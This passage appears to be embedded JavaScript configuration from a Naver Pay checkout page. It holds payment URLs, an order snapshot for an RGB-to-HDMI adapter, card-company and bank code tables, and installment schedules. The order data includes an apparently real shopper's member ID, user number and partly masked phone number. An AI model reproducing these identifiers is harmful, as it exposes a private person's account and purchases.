						"adult.authentication.return.url" : "http://order.pay.naver.com/orderSheetPopup/callback/adult/authentication",
						"partnership.shinhan.card.campaign.url" : "http://campaign.naver.com/event/npay-shinhanassociated_2009",
						"paylater.home.url" : "http://new-m.pay.naver.com/paylater",
						"paylater.signup.url" : "http://new-m.pay.naver.com/paylater/signup",
						"paylater.overdue.url" : "http://new-m.pay.naver.com/paylater/overdue",
						"paylater.payment.url" : "http://new-m.pay.naver.com/paylater/payment",
						"paylater.guide.url" : "http://new-m.pay.naver.com/paylater/guide",
						"paylater.callback.done" : "http://order.pay.naver.com/orderSheetPopup/callback/paylater/done",
						"membership.plcc.issue.url" : "http://campaign.naver.com/naverhyundaicard/?",
					"":""
				}
			,
			"isIE9" : "",
			"cashReceiptIssuePossiblePayMeans" : [	'BANK', 'VIRTUAL_ACCOUNT', 'CHARGED_POINT', 'PAY_LATER'
			],
			"orderClass" : "INTEGRATION_CART",
			"orderSnapshot" : {"saleChannelType":"SHOPN","orderSheetEntryType":"BUY_IMMEDIATELY","receiptIssue":true,"easyBooking":false,"localPay":false,"orderProducts":[{"orderAmount":15000,"merchantNo":510126036,"purchasable":true,"deliveryGroup":{"appliedExtraAreaFee":0,"bundle":true,"fee":2500,"appliedProductId":"2022031423515848","deliveryMethod":"DELIVERY","deliveryFeePayType":"PRE_PAY","id":"2022031490319617"},"items":[{"orderAmount":15000,"quantity":1,"purchasable":true,"payAmount":8700,"discountAmount":6300,"itemNo":"21998136642","price":0,"elements":[{"id":"21998136642","names":["선택"],"texts":["01_RGB to HDMI 젠더"],"type":"COMBINATION"}],"current":{"discounts":[{"discountPolicy":{"requiredCoupon":false,"mobileOnly":false,"sellerImmediateDiscountType":"IMMEDIATE","discountType":"SELLER_IMMEDIATE_DISCOUNT","policyNo":"SE_2512426784","discountUnit":"AMOUNT","discountValue":6300,"providerType":"MERCHANT"},"discountAmount":6300,"couponName":"즉시할인","applyCount":1,"unitDiscountAmount":6300,"available":true}],"sellerImmediateDiscount":{"discountPolicy":{"requiredCoupon":false,"mobileOnly":false,"sellerImmediateDiscountType":"IMMEDIATE","discountType":"SELLER_IMMEDIATE_DISCOUNT","policyNo":"SE_2512426784","discountUnit":"AMOUNT","discountValue":6300,"providerType":"MERCHANT"},"discountAmount":6300,"couponName":"즉시할인","applyCount":1,"unitDiscountAmount":6300,"available":true},"nmpMileage":{"basisAmount":87,"amount":87,"policy":{"accumulatedUnit":"RATE","accumulatedValue":1.0}},"totalNaverBenefitOnMileageAmount":87,"totalMileageAmount":87,"immediateDiscountAmount":6300},"id":"2022031426018307","type":"PRICING_OPTIONAL"}],"wholeCategoryId":"50000003>50000097>50001222>50003125","imageUrl":"http://shop1.phinf.naver.net/20220204_190/1643966214943ghT5c_JPEG/45102113427984279_482936723.jpg","benefits":{"benefitPolicies":{"sellerImmediateDiscount":{"requiredCoupon":false,"mobileOnly":false,"sellerImmediateDiscountType":"IMMEDIATE","discountType":"SELLER_IMMEDIATE_DISCOUNT","policyNo":"SE_2512426784","discountUnit":"AMOUNT","discountValue":6300,"providerType":"MERCHANT"},"immediateDiscountPolicies":[{"requiredCoupon":false,"mobileOnly":false,"sellerImmediateDiscountType":"IMMEDIATE","discountType":"SELLER_IMMEDIATE_DISCOUNT","policyNo":"SE_2512426784","discountUnit":"AMOUNT","discountValue":6300,"providerType":"MERCHANT"}],"nmpMileage":{"accumulatedUnit":"RATE","accumulatedValue":1.0},"nmpTextReviewMileage":{"accumulatedValue":50.0},"nmpPhotoVideoReviewMileage":{"accumulatedValue":150.0}}},"productId":"2515203719","salePrice":15000,"adultUser":false,"deliveryFee":{"freeConditionalAmount":0,"secondExtraFee":0,"thirdExtraFee":0,"baseFee":2500,"type":"CHARGE"},"sellerManagementCode":"NEXI","regDate":1647221954000,"totalPurchaseReviewNstamp":0,"totalPremiumPurchaseReviewNstamp":0,"totalPurchaseReviewMileage":50,"totalPremiumPurchaseReviewMileage":150,"securedImageUrl":"/o/proxy/phinf/shop1/20220204_190/1643966214943ghT5c_JPEG/45102113427984279_482936723.jpg","serviceType":"MP","name":"RGB to HDMI 젠더 변환 VGA to HDM 컨버터 모니터 잭","id":"2022031423515848"}],"orderClassType":"INTEGRATION_CART","orderSnapshotKey":"b78c81ab-8b44-486f-a3da-75000ef66b86","deliveryGroupMap":{"2022031490319617":{"appliedExtraAreaFee":0,"bundle":true,"fee":2500,"appliedProductId":"2022031423515848","deliveryMethod":"DELIVERY","deliveryFeePayType":"PRE_PAY","id":"2022031490319617"}},"deliveryFeeGroupMap":{"2022031490319617":2500},"userId":238621119,"escrowYn":false,"skipMallContractAgreement":false,"cultureBenefitYn":false,"productsOrderAmount":15000,"productsPayAmount":8700,"deliverysPayAmount":2500,"availableMainOrderQuantity":1,"orderPayAmount":11200,"orderDiscountAmount":0,"storeDiscounts":{},"storeDiscountAmount":0,"totalDiscountAmount":6300,"productAndStoreDiscountAmount":6300,"deliveryFeeDiscountAmount":0,"productsDiscountAmount":6300,"purchaser":{"memberId":"kikim0090","memberNumber":238621119},"deliveryNothing":false,"additionalInfoSupported":false,"styleWindow":false,"naverCafe":false,"exclusiveUseOfNaverBilling":false,"gifting":false,"branch":false,"naverBlog":false,"membershipExpectPoints":{"present":false},"totalMembershipExpectPoint":0,"subscription":false,"serviceType":"MP"},
			"privateCertificationLimit": 1,
			"remainNaverDon" : 0,
			"remainTotalNaverPoint" : 0,
			"remainNaverMileage" : 0,
			"remainChargeAmount" : 450000,
			"remainChargedPoint" : 0,
			"remainChargeLimit" : 450000,
			"remainPayLaterAmount" : 0,
			"isExistEcouponProduct" : false,
			"backUrl" : "http://smartstore.naver.com/withit/products/2515203719",
			"pgId" : "",
			"creditCardInfos" : {"CC":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_JBbank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"전북","pointdesc":"","corpcd":"CC","priority":"10"},"CD":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_jejubank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"제주","pointdesc":"","corpcd":"CD","priority":"11"},"CF":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_hanacard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"하나","pointdesc":"","corpcd":"CF","priority":"13"},"CH":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_hyundaicard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"현대","pointdesc":"","corpcd":"CH","priority":"2"},"C0":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_shinhanbank.gif","pointdescurl":"http://www.shinhancard.com/","pointname":"신한","pointusefg":"N","name":"신한카드","pointdesc":"신한카드 결제 시 신한 포인트 사용에 체크하신 후 결제하시면 됩니다.","corpcd":"C0","priority":"5"},"CP":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_kakaobank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"카카오뱅크","pointdesc":"","corpcd":"CP","priority":"22"},"C1":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_BCcard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"BC카드","pointdesc":"","corpcd":"C1","priority":"21"},"C2":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_KJbank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"광주","pointdesc":"","corpcd":"C2","priority":"21"},"CR":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_BCcard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"유니온페이","pointdesc":"","corpcd":"CR","priority":"0"},"C3":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_KBbank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"국민","pointdesc":"","corpcd":"C3","priority":"1"},"C4":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_NH.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"NH","pointdesc":"","corpcd":"C4","priority":"2"},"C5":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_lottecard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"롯데","pointdesc":"","corpcd":"C5","priority":"3"},"C6":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_KDB.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"산은","pointdesc":"","corpcd":"C6","priority":"4"},"C7":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_samsung.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"삼성","pointdesc":"","corpcd":"C7","priority":"1"},"C8":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_suhyupbank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"수협","pointdesc":"","corpcd":"C8","priority":"6"},"C9":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_citibank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"시티","pointdesc":"","corpcd":"C9","priority":"7"},"CA":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_hanacard.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"외환","pointdesc":"","corpcd":"CA","priority":"4"},"CB":{"eventinfo":[],"imgurl":"http://ssl.pstatic.net/static.pay/u/card/logocard_wooribank.gif","pointdescurl":"","pointname":"","pointusefg":"N","name":"우리","pointdesc":"","corpcd":"CB","priority":"9"}},
			"mileageMap" : {"TOTAL":87,"TOTAL_ADDITIONAL":0,"TOTAL_SCM":0,"TOTAL_MEMBERSHIP":0,"TOTAL_INFLOW":0,"2022031423515848":87,"TOTAL_ADMIN_ADDITIONAL":0,"TOTAL_PURCHASE":87},
			"purchaserPaymentInfo" : "",
			"defaultPaymentInfo" : {"easyPayYn":true,"cardCompanyTypeCode":"NC","payMeansClassType":"CREDIT_CARD"},
			"defaultSubPaymentInfo" : {"payMeansClassType":"CHARGED_POINT"},
			"restrictedReliefNumberList" :$A(["070","080","0130","0303","0502","0503","0504","0505","0506","0507","0508","050"]),
			"checkoutMerchantJson" : $H(),
			"nMileageExpireInfo" : {},
			"hasRegisteredEasyCard" : false,
			"hasRegisteredEasyBank" : false,
			"easyCardCode" : $A(["C0","CH","C7","C1","C3","CF","C5","C4","C9","CP","NC"]),
			"easyBankCode" : $A(["011","004","088","020","003","023","032","039","007","071","240","238","031","034","037","045","035","048","081","089","090","002","103","027","209","280","243","050","266","092","278","999"]),
			"registrationMethodCodeMap" : {"CREDIT_CARD":"NC","BANK":"999"},
			"availableCreditCardCorp" : ["C3","C1","C0","CH","C7","C5","CA","C4","CF","CB","C2","C8","C9","CC","CD","CP","CQ","CR"],
			"memberTelNumber":"010-9**7-0**0",
			"switchPayment" : false,
			"payMeansInquiryList" : [],
			"mallInfo" : "",
			"restrictPayMeans" : $A([]),
			"isEasyBooking" : false,
			"easyPayMileageRange" : "",
			"easyPayMileageMap" : "",
			"totalEasybookingMileage" : 0,
			"payEventBankRegisterAmount" : 0,
			"simplePaymentInfo" : false,
			"isForcedBillingPayment" : false,
			"isEscrow" : false,
			"isPinPayMember" : false,
			"isPinPayAgree":  false,
			"isDeliveryAddressAgreed" : true,
			"isAdult" : false,
			"registeredRecentPayMethodList" : $A(),
			"partnershipCardCodeList" : $A(),
			"isDiscountOptimization" : true,
			"hasTraditionalAlcoholProduct" :  false,
			"creditCardInstallmentUnavailableList" : $A(["CP","CR"]),
			"isOpenBankAgreed" :  true,
			"usePointAllYn": false,
			"usePayLaterAllYn": false,
			"useChargePointYn" : null,
			"isNaverBankbookRecentCharged" : false,
			"shinhanPartnershipCardReturnUrl" : "http://order.pay.naver.com/orderSheet/b78c81ab-8b44-486f-a3da-75000ef66b86/integrationCart?backUrl=http%3A%2F%2Fsmartstore.naver.com%2Fwithit%2Fproducts%2F2515203719",
			"totalDeliveryCouponCount" : 0,
			"serviceType":"MP",
			"cultureBenefitYn":"false",
			"hasMileagePay":"false",
			"deposits": "",
			
			"membershipPlccExpectedPercentage":"0.05",
			"membershipPlccExpectedMaximumAmount":"10,000",
			
			
			
			"allEasyBankUnderMaintenance":false,
			"hasPayableBank" : false,
			"":""
			});
			
			nmp.registerModule(nmp.front.order.order_sheet.integration_cart, {
			"urls" : 	{
						"order.ordersheet.mobile.return.url" : "http://order.pay.naver.com/orderSheetPopup/mobileResult",
						"order.ordersheet.pinMobile.return.url" : "http://order.pay.naver.com/orderSheetPopup/pinMobileResult",
						"order.ordersheet.easyPay.creditCard.return.url" : "http://order.pay.naver.com/orderSheetPopup/easyPayCreditCardSuccessResult",
						"order.ordersheet.easyPay.creditCard.cancel.url" : "http://order.pay.naver.com/orderSheetPopup/easyPayCreditCardFailResult",
						"order.ordersheet.easyPay.bank.return.url" : "http://order.pay.naver.com/orderSheetPopup/easyPayBankSuccessResult",
						"order.ordersheet.easyPay.bank.cancel.url" : "http://order.pay.naver.com/orderSheetPopup/easyPayBankFailResult",
						"order.ordersheet.generalPay.creditCard.return.url" : "http://order.pay.naver.com/orderSheetPopup/EUC-KR/creditCardResult",
						"order.ordersheet.generalPay.bank.return.url" : "http://order.pay.naver.com/orderSheetPopup/EUC-KR/bankResult",
					"":""
				}
			,
			"backUrl" : "http://smartstore.naver.com/withit/products/2515203719",
			"orderSnapshotKey":"b78c81ab-8b44-486f-a3da-75000ef66b86",
			"orderClass" : "INTEGRATION_CART",
			"creditPointArr": $H({CC:"",CD:"",CF:"",CH:"",C0:"신한",CP:"",C1:"",C2:"",CR:"",C3:"",C4:"",C5:"",C6:"",C7:"",C8:"",C9:"",CA:"",CB:""}),    
			"noInterestArr": $H({C5:"2,3,4,12,18,24,36",C7:"2,3,4,5,6,10,12,18,24",C3:"2,3,4,5,6,7,10,12",C4:"2,3,4,5,6,7,8,10,12",CH:"2,3,4,5,6,7,10",CA:"2,3,4,5,6,7,8,10,12",C0:"2,3,4,5,6,7,10,12",CB:"2,3,4,5,6,7,10,12",CC:"2,3,4,5,6,7,8,9,10,11,12",CF:"2,3,4,5,6,7,8,10,12",C2:"2,3,4,5,6,7",C1:"2,3,4,5,6,7,10,12"}),
			"payMeansInfos": {'OBANK':'40001','OBANK_minamt':'0','OBANK_maxamt':'0','OBANK_prvsnurl':'','OBANK_cinf':'','OCREDIT_CARD':'51277','OCREDIT_CARD_minamt':'10','OCREDIT_CARD_maxamt':'0','OCREDIT_CARD_prvsnurl':'','OCREDIT_CARD_cinf':'','BANK':'04001','BANK_minamt':'1000','BANK_maxamt':'2000000','BANK_prvsnurl':'','BANK_cinf':'1544-7772','MOBILE_PIN':'60001','MOBILE_PIN_minamt':'100','MOBILE_PIN_maxamt':'300000','MOBILE_PIN_prvsnurl':'http://mcash.mobilians.co.kr/web/m_mcash_terms_payment.html','MOBILE_PIN_cinf':'1600-0523, help@mobilians.co.kr','MOBILE':'05005','MOBILE_minamt':'10','MOBILE_maxamt':'300000','MOBILE_prvsnurl':'http://mcash.mobilians.co.kr/web/use_contract_dongijok.html','MOBILE_cinf':'1600-0523, help@mobilians.co.kr','CREDIT_CARD':'01057','CREDIT_CARD_minamt':'10','CREDIT_CARD_maxamt':'0','CREDIT_CARD_prvsnurl':'','CREDIT_CARD_cinf':'','VIRTUAL_ACCOUNT':'02001','VIRTUAL_ACCOUNT_minamt':'10','VIRTUAL_ACCOUNT_maxamt':'0','VIRTUAL_ACCOUNT_prvsnurl':'','VIRTUAL_ACCOUNT_cinf':'02-588-2722','DON':'71001'},
			"noInterestMonthArr": $H({C512:"12",C518:"18",C524:"24",C536:"36",C512:"12",C518:"18",C524:"24",C536:"36",C52:"2",C53:"3",C54:"4",C72:"2",C73:"3",C74:"4",C75:"5",C76:"6",C710:"10|1,2,3,4",C712:"12|1,2,3,4,5",C718:"18|1,2,3,4,5,6,7",C724:"24|1,2,3,4,5,6,7,8,9",C32:"2",C33:"3",C34:"4",C35:"5",C36:"6",C37:"7",C310:"10|1,2,3",C312:"12|1,2,3,4",C42:"2",C43:"3",C44:"4",C45:"5",C46:"6",C47:"7",C48:"8",C410:"10|1,2,3",C412:"12|1,2,3,4",CH2:"2",CH3:"3",CH4:"4",CH5:"5",CH6:"6",CH7:"7",CH10:"10",CA2:"2",CA3:"3",CA4:"4",CA5:"5",CA6:"6",CA7:"7",CA8:"8",CA10:"10|1,2,3",CA12:"12|1,2,3,4",C02:"2",C03:"3",C04:"4",C05:"5",C06:"6",C07:"7",C010:"10",C012:"12|1,2,3,4,5",CB2:"2",CB3:"3",CB4:"4",CB5:"5",CB6:"6",CB7:"7",CB10:"10|1,2,3",CB12:"12|1,2,3,4",CC2:"2",CC3:"3",CC4:"4",CC5:"5",CC6:"6",CC7:"7|1",CC8:"8|1",CC9:"9|1",CC10:"10|1,2",CC11:"11|1,2",CC12:"12|1,2",CF2:"2",CF3:"3",CF4:"4",CF5:"5",CF6:"6",CF7:"7",CF8:"8",CF10:"10|1,2,3",CF12:"12|1,2,3,4",C22:"2",C23:"3",C24:"4",C25:"5",C26:"6",C27:"7",C12:"2",C13:"3",C14:"4",C15:"5",C16:"6",C17:"7",C110:"10|1,2,3",C112:"12|1,2,3,4"}),
			"freeInterests" : {"CC":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"2","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"3","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"4","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"5","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004035","month":"6","corpcd":"CC","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1","chrgtype":"01","frinttypename":"부분","frintseq":"10004104","month":"7","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1","chrgtype":"01","frinttypename":"부분","frintseq":"10004037","month":"8","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1","chrgtype":"01","frinttypename":"부분","frintseq":"10004038","month":"9","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2","chrgtype":"01","frinttypename":"부분","frintseq":"10004039","month":"10","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2","chrgtype":"01","frinttypename":"부분","frintseq":"10004040","month":"11","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2","chrgtype":"01","frinttypename":"부분","frintseq":"10004041","month":"12","corpcd":"CC","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"CF":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"2","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"3","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"4","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"5","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"6","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"7","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004025","month":"8","corpcd":"CF","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004026","month":"10","corpcd":"CF","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004027","month":"12","corpcd":"CF","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"CH":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"2","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"3","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"4","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"5","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"6","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004103","month":"7","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"10000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004018","month":"10","corpcd":"CH","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"300000"}],"C0":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"2","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"3","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"4","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"5","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"6","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"7","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004017","month":"10","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","partmos":"1,2,3,4,5","chrgtype":"01","frinttypename":"부분","frintseq":"10004008","month":"12","corpcd":"C0","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C1":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"2","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"3","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"4","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"5","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"6","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"7","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004012","month":"10","corpcd":"C1","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004013","month":"12","corpcd":"C1","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C2":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"2","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"3","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"4","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"5","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"6","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"7","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C3":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"2","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"3","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"4","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"5","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"6","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"7","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004009","month":"10","corpcd":"C3","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004010","month":"12","corpcd":"C3","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C4":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"2","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"3","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"4","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"5","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"6","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004107","month":"7","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004107","month":"8","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004032","month":"10","corpcd":"C4","frint